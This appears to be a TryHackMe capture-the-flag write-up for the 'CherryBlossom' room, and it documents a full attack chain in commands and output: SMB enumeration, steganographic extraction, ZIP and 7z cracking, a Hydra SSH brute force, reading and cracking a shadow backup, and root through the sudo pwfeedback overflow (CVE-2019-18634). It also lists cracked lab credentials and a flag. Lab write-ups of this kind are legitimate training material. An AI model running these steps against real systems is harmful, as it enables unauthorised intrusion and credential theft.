# CherryBlossom - TryHackMe Write-up

**Room:** CherryBlossom  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Type:** SMB / Steganography / Crypto / Password Cracking / Linux Privilege Escalation  
**Status:** Completed  

---

## Disclaimer

This write-up is for educational purposes only.  
The challenge was completed in a legal TryHackMe lab environment.

---

## Room Overview

CherryBlossom is a boot-to-root TryHackMe room focused on cryptography, steganography, password cracking, and Linux privilege escalation.

The attack path was:

```text
Recon -> SMB enumeration -> Base64 decoding -> PNG steganography -> ZIP cracking -> CherryTree journal extraction -> Custom wordlist -> SSH brute force -> Shadow backup cracking -> User pivot -> Sudo pwfeedback exploit -> Root
````

The main techniques used were:

* SMB anonymous enumeration
* Base64 decoding
* Image steganography with `stegpy`
* ZIP password cracking with John
* 7z / CherryTree archive extraction
* Custom wordlist extraction
* SSH password attack
* Shadow hash cracking
* Local privilege escalation using sudo `pwfeedback` vulnerability

---

## Enumeration

I started with a full Nmap scan:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Result:

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu
```

The machine exposed SSH and SMB.

The SMB scan also revealed the hostname:

```text
Computer name: cherryblossom
Workgroup: WORKGROUP
```

---

## SMB Enumeration

I enumerated the SMB shares with `smbmap`:

```bash
smbmap -H <TARGET_IP>
```

Result:

```text
Disk        Permissions  Comment
----        -----------  -------
Anonymous   READ ONLY    Anonymous File Server Share
IPC$        NO ACCESS    IPC Service
```

The `Anonymous` share was readable without credentials.

I connected to it:

```bash
smbclient //<TARGET_IP>/Anonymous -N
```

Then downloaded all files:

```text
recurse ON
prompt OFF
ls
mget *
exit
```

Only one interesting file was found:

```text
journal.txt
```

---

## Inspecting `journal.txt`

The file looked like a large ASCII blob.

```bash
file journal.txt
```

Result:

```text
journal.txt: ASCII text
```

The content appeared to be Base64-encoded data, so I decoded it:

```bash
base64 -d journal.txt > journal.png
file journal.png
```

Result:

```text
journal.png: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
```

This confirmed that `journal.txt` was actually a Base64-encoded PNG image.

---

## Steganography

Since the room focuses on crypto and hidden data, I checked the PNG for steganography.

I used `stegpy`:

```bash
python3 -m venv ~/venvs/stegpy
source ~/venvs/stegpy/bin/activate
pip install stegpy
```

Then extracted hidden data:

```bash
stegpy journal.png
```

This produced:

```text
_journal.zip
```

The extracted file had an incorrect magic header, so I checked it:

```bash
xxd -l 16 _journal.zip
file _journal.zip
```

The file needed its ZIP magic bytes restored:

```bash
printf '\x50\x4b\x03\x04' | dd of=_journal.zip bs=1 count=4 conv=notrunc
file _journal.zip
```

After fixing the header, it was recognized as a ZIP archive.

---

## Cracking the ZIP

I converted the ZIP into a John hash:

```bash
zip2john _journal.zip > zip.hash
```

Then cracked it with `rockyou.txt`:

```bash
john --wordlist=/usr/share/dict/rockyou.txt zip.hash
john --show zip.hash
```

Result:

```text
_journal.zip/Journal.ctz:september
```

The ZIP password was:

```text
september
```

I extracted it:

```bash
unzip -P september _journal.zip
```

This revealed:

```text
Journal.ctz
```

---

## Extracting the CherryTree Journal

The extracted file was a 7z archive:

```bash
file Journal.ctz
```

Result:

```text
Journal.ctz: 7-zip archive data
```

The archive password was cracked/recovered as:

```text
tigerlily
```

If `7z` is installed, it can be extracted with:

```bash
7z x Journal.ctz -ptigerlily
```

In my case, I used Python with `py7zr`:

```bash
pip install py7zr
```

Then extracted it:

```python
import py7zr

with py7zr.SevenZipFile("Journal.ctz", mode="r", password="tigerlily") as z:
    z.extractall(path="ctz_out")

print("[OK] extracted")
```

The extracted content was a CherryTree XML journal.

---

## Reading the Journal

The journal contained several diary entries.

Important information:

```text
My girlfriend, Lily, picked a password from my custom password list.
```

Another important note mentioned a custom wordlist:

```text
cherry-blossom.list
```

The journal also contained an embedded attachment:

```xml
<encoded_png filename="cherry-blossom.list">...</encoded_png>
```

This attachment was Base64-encoded.

---

## Extracting the Custom Wordlist

I extracted the embedded wordlist from the CherryTree XML:

```python
from pathlib import Path
import re
import base64
import html

for p in Path(".").rglob("*"):
    if not p.is_file():
        continue

    text = p.read_text(errors="ignore")

    matches = re.findall(
        r'<encoded_png[^>]*filename="([^"]+)"[^>]*>(.*?)</encoded_png>',
        text,
        flags=re.S
    )

    for filename, data in matches:
        filename = html.unescape(filename)
        data = "".join(data.split())
        raw = base64.b64decode(data)

        out = Path(filename)
        out.write_bytes(raw)

        print(f"[OK] extracted {out} ({len(raw)} bytes)")
```

This produced:

```text
cherry-blossom.list
```

I checked it:

```bash
head cherry-blossom.list
wc -l cherry-blossom.list
```

---

## Journal Flag

Searching the extracted journal revealed the journal flag:

```bash
grep -RaoE 'THM\{[^}]+\}' .
```

Journal flag:

```text
THM{054a8f1db7618f8f6a41a0b3349baa11}
```

---

## Cracking Lily's SSH Password

From the journal, I knew:

* The username was likely `lily`
* Her password was chosen from `cherry-blossom.list`

I used Hydra against SSH:

```bash
hydra -l lily -P cherry-blossom.list ssh://<TARGET_IP> -t 4 -f -I
```

Hydra found:

```text
lily : Mr.$un$hin3
```

I logged in via SSH:

```bash
ssh lily@<TARGET_IP>
```

Password:

```text
Mr.$un$hin3
```

Successful login:

```text
Welcome, Lily
```

---

## Local Enumeration as Lily

After logging in as `lily`, I checked common locations:

```bash
whoami
id
ls -la
```

Then I checked backups:

```bash
ls -la /var/backups
```

A readable shadow backup was present:

```text
/var/backups/shadow.bak
```

I read it:

```bash
cat /var/backups/shadow.bak
```

This exposed password hashes for local users, including `johan`.

---

## Cracking Johan's Password

I copied the backup locally:

```bash
scp lily@<TARGET_IP>:/var/backups/shadow.bak .
```

Then extracted Johan's hash:

```bash
grep '^johan:' shadow.bak > johan.hash
```

I cracked it with the custom wordlist:

```bash
john --wordlist=cherry-blossom.list johan.hash
john --show johan.hash
```

Result:

```text
johan : ##scuffleboo##
```

Johan's password was:

```text
##scuffleboo##
```

---

## Pivoting to Johan

From the SSH session as Lily:

```bash
su - johan
```

Password:

```text
##scuffleboo##
```

I confirmed the user:

```bash
whoami
id
```

Result:

```text
johan
```

The user flag was located in Johan's home directory:

```bash
cat ~/user.txt
```

User flag:

```text
<USER_FLAG_HERE>
```

---

## Privilege Escalation Enumeration

I checked sudo permissions:

```bash
sudo -l
```

Result:

```text
Sorry, user johan may not run sudo on cherryblossom.
```

At first, this looked like a dead end.

However, while entering Johan's password for sudo, the password feedback feature was visible. This means sudo was configured with `pwfeedback`.

That is important because vulnerable sudo versions with `pwfeedback` enabled are affected by:

```text
CVE-2019-18634
```

This is a buffer overflow vulnerability in sudo.

---

## Confirming the Sudo Vulnerability

I tested for the crash:

```bash
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S /bin/bash
```

If the binary crashes with a segmentation fault, the target is vulnerable.

---

## Exploiting CVE-2019-18634

On my local machine, I cloned a public exploit:

```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
cd sudo-cve-2019-18634
make
```

This produced an exploit binary.

I uploaded it to the target:

```bash
scp exploit lily@<TARGET_IP>:/tmp/exploit
```

Then, from the target as `johan`:

```bash
cd /tmp
chmod +x exploit
./exploit
```

After successful exploitation:

```bash
whoami
id
```

Result:

```text
root
```

---

## Root Flag

As root:

```bash
cat /root/root.txt
```

Root flag:

```text
<ROOT_FLAG_HERE>
```

---

## Final Credentials

### ZIP Password

```text
september
```

### CherryTree / 7z Password

```text
tigerlily
```

### Lily SSH Credentials

```text
lily : Mr.$un$hin3
```

### Johan Credentials

```text
johan : ##scuffleboo##
```

---

## Final Flags

### Journal Flag

```text
THM{054a8f1db7618f8f6a41a0b3349baa11}
```

### User Flag

```text
<USER_FLAG_HERE>
```

### Root Flag

```text
<ROOT_FLAG_HERE>
```

---

## What I Learned

This room was a strong example of a multi-stage CTF chain.

Key takeaways:

* Anonymous SMB shares can expose sensitive files.
* Base64 text blobs should always be decoded and identified with `file`.
* Image files may hide embedded data through steganography.
* Damaged magic bytes can hide the real file type.
* `zip2john` and John are useful for cracking protected archives.
* CherryTree files can contain embedded attachments.
* Custom wordlists found during enumeration can be more effective than generic lists.
* Backup files such as `shadow.bak` can expose password hashes.
* Password reuse and weak custom password schemes can allow user pivoting.
* Sudo misconfigurations and vulnerable versions can lead to root.

---

## Attack Chain Summary

```text
1. Scanned the target and found SSH + SMB
2. Found anonymous SMB share
3. Downloaded journal.txt
4. Decoded journal.txt from Base64 into journal.png
5. Extracted hidden ZIP from PNG using stegpy
6. Fixed ZIP magic bytes
7. Cracked ZIP password with John: september
8. Extracted Journal.ctz
9. Decrypted CherryTree archive with password: tigerlily
10. Read the journal and found Lily + custom wordlist clue
11. Extracted cherry-blossom.list from embedded Base64 attachment
12. Cracked Lily's SSH password: Mr.$un$hin3
13. Logged in as lily
14. Found /var/backups/shadow.bak
15. Cracked Johan's hash: ##scuffleboo##
16. Switched to johan
17. Exploited sudo pwfeedback vulnerability
18. Got root
```

---

## Conclusion

CherryBlossom was a fun and realistic boot-to-root room with a strong focus on crypto, password cracking, and chaining clues together.

The most interesting part was how the initial SMB file led through several layers of encoding, steganography, archive cracking, and journal analysis before finally producing a useful SSH password.

```
```
# CherryBlossom---TryHackMe-Write-up-by-PXWN3D
